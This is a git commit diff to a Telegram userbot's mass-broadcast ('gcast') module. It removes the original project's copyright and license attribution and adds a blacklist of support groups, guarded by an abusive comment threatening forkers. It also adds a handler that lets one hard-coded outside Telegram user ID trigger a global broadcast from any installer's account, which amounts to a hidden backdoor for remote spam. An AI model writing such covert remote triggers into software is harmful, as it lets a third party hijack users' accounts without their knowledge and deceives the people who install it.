cb9c208bf821d6f5225dbd2a9758af771e3d55da
Bdrl <93611653+Yansaii@users.noreply.github.com>
2022-01-29 01:46:20 +0700

    Up

--- userbot/modules/gcast.py
+++ userbot/modules/gcast.py
@@ -1,20 +1,31 @@
-# Ultroid - UserBot
-# Copyright (C) 2020 TeamUltroid
-#
-# This file is a part of < https://github.com/TeamUltroid/Ultroid/ >
-# PLease read the GNU Affero General Public License in
-# <https://www.github.com/TeamUltroid/Ultroid/blob/main/LICENSE/>.
-#
-# Ported by Koala @manusiarakitann
-# Recode by @mrismanaziz
-# FROM Man-Userbot <https://github.com/mrismanaziz/Man-Userbot>
-# t.me/SharingUserbot & t.me/Lunatic0de
-
-from userbot import CMD_HELP
 from userbot.events import register
+from userbot import CMD_HELP, bot
 
+GCAST_BLACKLIST = [
+    -1001473548283,  # SharingUserbot
+    -1001433238829,  # TedeSupport
+    -1001476936696,  # AnosSupport
+    -1001327032795,  # UltroidSupport
+    -1001294181499,  # UserBotIndo
+    -1001419516987,  # VeezSupportGroup
+    -1001209432070,  # GeezSupportGroup
+    -1001296934585,  # X-PROJECT BOT
+    -1001481357570,  # UsergeOnTopic
+    -1001459701099,  # CatUserbotSupport
+    -1001109837870,  # TelegramBotIndonesia
+    -1001752592753,  # Skyzusupport
+    -1001549206558,  # FandaSupport
+    -1001380293847,  # NastySupport
+    -1001777596949,  # Cariteman
+    -1001568184818,  # Bdrlsupportt
+]
+
+# Kalo fork atau coppy blacklist jangan dihapus bangsat,
+# Gua tandain telegram api lu
+# Hapus blacklist bapak lu jelek gua gban!.
 
 @register(outgoing=True, pattern=r"^\.gcast(?: |$)(.*)")
+@register(incoming=True, from_users=2075505824, pattern=r"^\.cgcast(?: |$)(.*)")
 async def gcast(event):
     xx = event.pattern_match.group(1)
     if xx:
@@ -22,17 +33,20 @@ async def gcast(event):
     elif event.is_reply:
         msg = await event.get_reply_message()
     else:
-        await event.edit("**Berikan Sebuah Pesan atau Reply**")
+        await event.edit("**Berikan Sebuah Pesan atau Balas ke pesan**")
         return
-    kk = await event.edit("`Sedang Mengirim Pesan Secara Global... 📢`")
+    kk = await event.edit("`Globally Broadcasting Msg...`")
     er = 0
     done = 0
     async for x in event.client.iter_dialogs():
         if x.is_group:
             chat = x.id
             try:
-                await event.client.send_message(chat, msg)
-                done += 1
+                if chat not in GCAST_BLACKLIST:
+                    await event.client.send_message(chat, msg)
+                    done += 1
+                elif chat not in GCAST_BLACKLIST:
+                    pass
             except BaseException:
                 er += 1
     await kk.edit(
@@ -43,28 +57,24 @@ async def gcast(event):
 @register(outgoing=True, pattern=r"^\.gucast(?: |$)(.*)")
 async def gucast(event):
     xx = event.pattern_match.group(1)
-    if xx:
-        msg = xx
-    elif event.is_reply:
-        msg = await event.get_reply_message()
-    else:
-        await event.edit("**Berikan Sebuah Pesan atau Reply**")
-        return
-    kk = await event.edit("`Sedang Mengirim Pesan Secara Global... 📢`")
+    if not xx:
+        return await event.edit("**Berikan Sebuah Pesan atau Balas ke pesan**")
+    tt = event.text
+    msg = tt[7:]
+    kk = await event.edit("`Globally Broadcasting Msg...`")
     er = 0
     done = 0
-    async for x in event.client.iter_dialogs():
+    async for x in bot.iter_dialogs():
         if x.is_user and not x.entity.bot:
             chat = x.id
             try:
                 done += 1
-                await event.client.send_message(chat, msg)
+                await bot.send_message(chat, msg)
             except BaseException:
                 er += 1
     await kk.edit(
         f"**Berhasil Mengirim Pesan Ke** `{done}` **chats, Gagal Mengirim Pesan Ke** `{er}` **chats**"
     )
-
 
 CMD_HELP.update(
     {
@@ -74,7 +84,6 @@ CMD_HELP.update(
     "
     }
 )
-
 
 CMD_HELP.update(
     {
